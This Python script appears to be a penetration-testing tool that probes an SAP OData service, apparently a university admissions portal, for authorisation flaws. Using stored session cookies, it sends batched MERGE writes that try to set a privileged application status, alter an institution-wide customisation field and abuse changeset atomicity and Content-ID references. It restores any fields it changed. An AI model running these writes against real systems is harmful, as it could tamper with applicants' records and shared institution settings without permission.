#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Track F consolidated batched-write pass — Sweep 11 + Sweep 12 + F1.2 + F1.5.

Design: each phase = ONE POST /$batch containing all its MERGEs in one
changeset. That compresses ~15 OData operations into 4 HTTP requests as
seen by SAP Web Dispatcher's ACL.

Phase A — Sweep 11 (Applications gap fields):
  1 batch with a changeset containing 2 MERGEs:
    MERGE Applications('<A>') {appFeePayURL: "http://kltest.example/"}
    MERGE Applications('<A>') {templateMergeContent: "KLTEST_S11_TMC"}

Phase B — Sweep 12 (OrganisationCustomisations, single-field probe):
  1 batch with 1 MERGE:
    MERGE OrganisationCustomisations('50000050') {imageLeft: "KLTEST_S12_PROBE"}
  Very conservative — one field only. If it 204s, cross-institution
  poisoning would affect any applicant at KUL. Restore immediately.

Phase C — F1.2 (changeset atomicity abuse):
  1 batch with a changeset of 2 MERGEs:
    Op 1 (known-legal, HigherEd row):
      MERGE HigherEducations('0') {higherEducationId:"000001", nameSchool:"KLTEST_F12_LEGAL"}
    Op 2 (known-forbidden, Applications priv-field):
      MERGE Applications('<A>') {statusCode:"211"}
  If op 2 rides the transaction, statusCode changes = Critical.

Phase D — F1.5 (Content-ID $1 reference smuggling):
  1 batch with a changeset containing 2 MERGEs, where op 2 references op 1
  via $1 (a URL relative to the first op's response):
    Op 1: MERGE HigherEducations('0') {higherEducationId:"000001", nameSchool:"KLTEST_F15"}
    Op 2: MERGE $1 {nameSchool:"KLTEST_F15_REF"}
  Tests whether Content-ID smuggling can rewrite scope after resolution.

Total non-safe: 4 batched POSTs + up to 4 restore batches = 8 max.
Cleanup mandatory in `finally:` — restore every field/row we may have flipped.
"""
import argparse
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import authz_matrix as m


APP_A = "000000503432"
INST = "50000050"


def batch_body_multi(changeset_ops, boundary="batch_klxb", cs_boundary="changeset_klxc"):
    """Build a $batch with ONE changeset containing multiple ops.
    Each op is (method, entity_rel, body_dict, content_id_str_or_None).
    Applies the same three format fixes as authz_matrix._batch_body:
      inner URL carries sap-client, explicit Content-Length, no leading slash.
    """
    lines = [
        f"--{boundary}",
        f"Content-Type: multipart/mixed; boundary={cs_boundary}",
        "",
    ]
    for i, (method, rel, body_dict, cid) in enumerate(changeset_ops, 1):
        payload = json.dumps(body_dict) if body_dict is not None else ""
        target = rel.lstrip("/")
        if not target.startswith("$") and "sap-client=" not in target:
            target = target + ("&" if "?" in target else "?") + "sap-client=200"
        content_id = cid or str(i)
        lines += [
            f"--{cs_boundary}",
            "Content-Type: application/http",
            "Content-Transfer-Encoding: binary",
            f"Content-ID: {content_id}",
            "",
            f"{method} {target} HTTP/1.1",
            "Content-Type: application/json",
            f"Content-Length: {len(payload)}",
            "Accept: application/json",
            "",
            payload,
            "",
        ]
    lines += [
        f"--{cs_boundary}--",
        "",
        f"--{boundary}--",
        "",
    ]
    return ("\r\n".join(lines)).encode("utf-8"), boundary


def send_batch(client, session, changeset_ops, logger, sweep, note):
    body, boundary = batch_body_multi(changeset_ops)
    r = client.request(session, "POST", "$batch", body=body,
                       extra_headers={"Content-Type":
                                      f"multipart/mixed; boundary={boundary}"},
                       note=note)
    inners = m._parse_batch_inner_statuses(r.get("text", "") or "")
    logger.log(sweep, "$batch", "POST", note, r,
               [f"outer={r.get('status')}",
                f"inner_statuses={inners}",
                f"ops={len(changeset_ops)}"])
    return r.get("status"), inners, r.get("text", "") or ""


def read_field(client, session, entity_rel, field, logger, sweep, note):
    r = m.read_entity(client, session, entity_rel, logger, sweep, note)
    return m.json_field(r.get("text", ""), field), r


# ---------------------------------------------------------------------------
def phase_sweep11(client, sA, logger, to_restore):
    """Sweep 11 — appFeePayURL + templateMergeContent on Applications."""
    print("\n=== Sweep 11 — Applications gap fields via batch ===", file=sys.stderr)
    entity = f"Applications('{APP_A}')"
    # baselines
    base_appFee, _ = read_field(client, sA, entity, "appFeePayURL", logger,
                                 "s11", "S11 baseline appFeePayURL")
    base_tmc, _ = read_field(client, sA, entity, "templateMergeContent", logger,
                              "s11", "S11 baseline templateMergeContent")
    logger.log("s11", entity, "NOTE", "S11 baselines",
               {"status": "n/a", "text": ""},
               [f"appFeePayURL={base_appFee!r}",
                f"templateMergeContent={base_tmc!r}"])
    # batch with 2 MERGEs
    ops = [
        ("MERGE", entity, {"appFeePayURL": "http://kltest.example/"}, "1"),
        ("MERGE", entity, {"templateMergeContent": "KLTEST_S11_TMC"}, "2"),
    ]
    outer, inners, _ = send_batch(client, sA, ops, logger, "s11",
                                    "S11 batch: appFeePayURL + templateMergeContent")
    # re-read + compare
    now_appFee, _ = read_field(client, sA, entity, "appFeePayURL", logger,
                                 "s11", "S11 re-read appFeePayURL")
    now_tmc, _ = read_field(client, sA, entity, "templateMergeContent", logger,
                             "s11", "S11 re-read templateMergeContent")
    a_changed = (now_appFee != base_appFee) and (now_appFee == "http://kltest.example/")
    t_changed = (now_tmc != base_tmc) and (now_tmc == "KLTEST_S11_TMC")
    logger.log("s11", entity, "COMPARE", "S11 verdict",
               {"status": "n/a", "text": ""},
               [f"outer={outer}", f"inners={inners}",
                f"appFeePayURL_before={base_appFee!r}", f"appFeePayURL_after={now_appFee!r}",
                f"appFeePayURL_changed={a_changed}",
                f"templateMergeContent_before={base_tmc!r}",
                f"templateMergeContent_after={now_tmc!r}",
                f"templateMergeContent_changed={t_changed}",
                "ANOMALY_s11_field_persisted" if (a_changed or t_changed) else ""])
    if a_changed:
        to_restore.append(("s11", entity, "appFeePayURL", base_appFee))
    if t_changed:
        to_restore.append(("s11", entity, "templateMergeContent", base_tmc))


def phase_sweep12(client, sA, sB, logger, to_restore):
    """Sweep 12 — OrganisationCustomisations single-field probe."""
    print("\n=== Sweep 12 — OrganisationCustomisations single-field ===", file=sys.stderr)
    entity = f"OrganisationCustomisations('{INST}')"
    base_imgLeft, _ = read_field(client, sA, entity, "imageLeft", logger,
                                   "s12", "S12 baseline imageLeft")
    logger.log("s12", entity, "NOTE", "S12 baseline",
               {"status": "n/a", "text": ""},
               [f"imageLeft={base_imgLeft!r}"])
    ops = [("MERGE", entity, {"imageLeft": "KLTEST_S12_PROBE"}, "1")]
    outer, inners, _ = send_batch(client, sA, ops, logger, "s12",
                                    "S12 batch: imageLeft probe")
    now_imgLeft, _ = read_field(client, sA, entity, "imageLeft", logger,
                                  "s12", "S12 re-read A imageLeft")
    changed = (now_imgLeft != base_imgLeft) and (now_imgLeft == "KLTEST_S12_PROBE")
    b_check = None
    if changed:
        # cross-user render check
        now_b, _ = read_field(client, sB, entity, "imageLeft", logger,
                                "s12", "S12 cross-tenant read B")
        b_check = now_b
    logger.log("s12", entity, "COMPARE", "S12 verdict",
               {"status": "n/a", "text": ""},
               [f"outer={outer}", f"inners={inners}",
                f"imageLeft_before={base_imgLeft!r}",
                f"imageLeft_after={now_imgLeft!r}",
                f"changed={changed}",
                f"B_imageLeft={b_check!r}",
                "ANOMALY_s12_customisation_persisted" if changed else "",
                "ANOMALY_s12_cross_institution_render" if b_check == "KLTEST_S12_PROBE" else ""])
    if changed:
        to_restore.append(("s12", entity, "imageLeft", base_imgLeft))


def phase_f12(client, sA, logger, to_restore):
    """F1.2 — changeset atomicity: legal + forbidden in same changeset."""
    print("\n=== F1.2 — changeset atomicity abuse ===", file=sys.stderr)
    higher_entity = "HigherEducations('0')"
    app_entity = f"Applications('{APP_A}')"
    # We already know both endpoints' baseline from prior phases; capture the
    # ones that matter for this test.
    higher_ns_baseline, _ = read_field(client, sA,
                                         "Curriculums('0')/HigherEducations",
                                         "nameSchool", logger, "f1.2",
                                         "F1.2 baseline HigherEd nameSchool")
    # find the row 000001 within the collection response
    rr = m.read_entity(client, sA, "Curriculums('0')/HigherEducations",
                        logger, "f1.2", "F1.2 baseline HigherEd rows")
    try:
        rows = json.loads(rr.get("text",""))["d"]["results"]
        row = next((x for x in rows if str(x.get("higherEducationId")) == "000001"),
                    None)
        higher_ns_baseline = row.get("nameSchool") if row else None
    except Exception:
        higher_ns_baseline = None
    app_status_baseline, _ = read_field(client, sA, app_entity, "statusCode",
                                          logger, "f1.2", "F1.2 baseline statusCode")
    logger.log("f1.2", "atomicity", "NOTE", "F1.2 baselines",
               {"status": "n/a", "text": ""},
               [f"higher_nameSchool={higher_ns_baseline!r}",
                f"app_statusCode={app_status_baseline!r}"])

    ops = [
        ("MERGE", higher_entity, {"higherEducationId": "000001",
                                    "nameSchool": "KLTEST_F12_LEGAL"}, "1"),
        ("MERGE", app_entity, {"statusCode": "211"}, "2"),
    ]
    outer, inners, _ = send_batch(client, sA, ops, logger, "f1.2",
                                    "F1.2 batch: legal HigherEd + forbidden Applications.statusCode")
    # Read back both
    rr2 = m.read_entity(client, sA, "Curriculums('0')/HigherEducations",
                         logger, "f1.2", "F1.2 re-read HigherEd rows")
    row_after = None
    try:
        rows = json.loads(rr2.get("text",""))["d"]["results"]
        row_after = next((x for x in rows if str(x.get("higherEducationId")) == "000001"),
                          None)
    except Exception:
        pass
    higher_ns_after = row_after.get("nameSchool") if row_after else None
    app_status_after, _ = read_field(client, sA, app_entity, "statusCode",
                                       logger, "f1.2", "F1.2 re-read statusCode")

    higher_landed = (higher_ns_after == "KLTEST_F12_LEGAL")
    forbidden_persisted = (app_status_after == "211")

    if higher_landed and forbidden_persisted:
        verdict = "CRITICAL_ATOMICITY_BYPASS_forbidden_op_rode_transaction"
    elif not higher_landed and not forbidden_persisted:
        verdict = "BOTH_ROLLED_BACK_transactional_per_changeset"
    elif higher_landed and not forbidden_persisted:
        verdict = "SAFE_per_op_authz_legal_landed_forbidden_dropped"
    else:
        verdict = "UNEXPECTED_forbidden_persisted_legal_rejected"

    flags = [f"outer={outer}", f"inners={inners}",
             f"higher_landed={higher_landed}",
             f"forbidden_persisted={forbidden_persisted}",
             f"VERDICT={verdict}"]
    if "CRITICAL" in verdict:
        flags.append("ANOMALY_changeset_atomicity_bypass")
    logger.log("f1.2", "atomicity", "COMPARE", "F1.2 verdict",
               {"status": "n/a", "text": ""}, flags)
    if higher_landed:
        to_restore.append(("f1.2", higher_entity,
                            {"higherEducationId": "000001",
                             "nameSchool": higher_ns_baseline or ""}))
    if forbidden_persisted:
        to_restore.append(("f1.2", app_entity, "statusCode", app_status_baseline))


def phase_f15(client, sA, logger, to_restore):
    """F1.5 — Content-ID $1 reference smuggling."""
    print("\n=== F1.5 — Content-ID reference smuggling ===", file=sys.stderr)
    higher_entity = "HigherEducations('0')"
    # Op 1 creates/updates a row with Content-ID:1. Op 2 references $1 as its
    # target URL — this is SAP's supported "reference the previous op's created
    # entity" pattern. If the server resolves $1 by ignoring the op1 target and
    # somehow crossing into another scope, that's the smuggling case.
    ops = [
        ("MERGE", higher_entity, {"higherEducationId": "000001",
                                    "nameSchool": "KLTEST_F15_OP1"}, "1"),
        ("MERGE", "$1", {"nameSchool": "KLTEST_F15_OP2_REF"}, "2"),
    ]
    outer, inners, txt = send_batch(client, sA, ops, logger, "f1.5",
                                     "F1.5 batch: Op1 + Op2 with $1 reference")
    # Read back
    rr = m.read_entity(client, sA, "Curriculums('0')/HigherEducations",
                        logger, "f1.5", "F1.5 re-read HigherEd rows")
    try:
        rows = json.loads(rr.get("text",""))["d"]["results"]
        row = next((x for x in rows if str(x.get("higherEducationId")) == "000001"),
                    None)
    except Exception:
        row = None
    ns_after = row.get("nameSchool") if row else None
    op1_landed = (ns_after in ("KLTEST_F15_OP1", "KLTEST_F15_OP2_REF"))
    ref_resolved = (ns_after == "KLTEST_F15_OP2_REF")
    logger.log("f1.5", higher_entity, "COMPARE", "F1.5 verdict",
               {"status": "n/a", "text": ""},
               [f"outer={outer}", f"inners={inners}",
                f"nameSchool_after={ns_after!r}",
                f"op1_landed={op1_landed}",
                f"ref_resolved={ref_resolved}"])
    if op1_landed:
        to_restore.append(("f1.5", higher_entity,
                            {"higherEducationId": "000001",
                             "nameSchool": "KLTEST_S10_SEED_A"}))


def cleanup(client, sA, to_restore, logger):
    print(f"\n=== CLEANUP — restoring {len(to_restore)} landed fields ===",
          file=sys.stderr)
    for entry in to_restore:
        if len(entry) == 4:
            sweep, entity, field, baseline = entry
            body_dict = {field: baseline if baseline is not None else ""}
        else:
            sweep, entity, body_dict = entry
        note = f"CLEANUP restore {entity} {list(body_dict.keys())}"
        try:
            outer, inners, _ = send_batch(client, sA,
                                            [("MERGE", entity, body_dict, "1")],
                                            logger, sweep, note)
            logger.log(sweep, entity, "RESTORE_VERIFY", note,
                       {"status": "n/a", "text": ""},
                       [f"outer={outer}", f"inners={inners}", "cleanup"])
        except Exception as e:
            logger.log(sweep, entity, "RESTORE_ERR", note,
                       {"status": "ERR", "text": str(e)[:120]}, ["cleanup"])


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--min-interval", type=float, default=8.0)
    args = ap.parse_args()
    m.MIN_INTERVAL = args.min_interval
    print(f"[cadence] MIN_INTERVAL={m.MIN_INTERVAL}", file=sys.stderr)

    client = m.Client()
    logger = m.MatrixLogger(m.JSONL_PATH, append=True)
    sA = m.Session("A", m.load_cookie_header(m.CREDS_DIR + "/A.cookies"))
    sB = m.Session("B", m.load_cookie_header(m.CREDS_DIR + "/B.cookies"))
    client.fetch_csrf(sA); client.fetch_csrf(sB)

    to_restore = []
    try:
        phase_sweep11(client, sA, logger, to_restore)
        phase_sweep12(client, sA, sB, logger, to_restore)
        phase_f12(client, sA, logger, to_restore)
        phase_f15(client, sA, logger, to_restore)
    finally:
        cleanup(client, sA, to_restore, logger)
    print("\n=== DONE ===", file=sys.stderr)


if __name__ == "__main__":
    main()
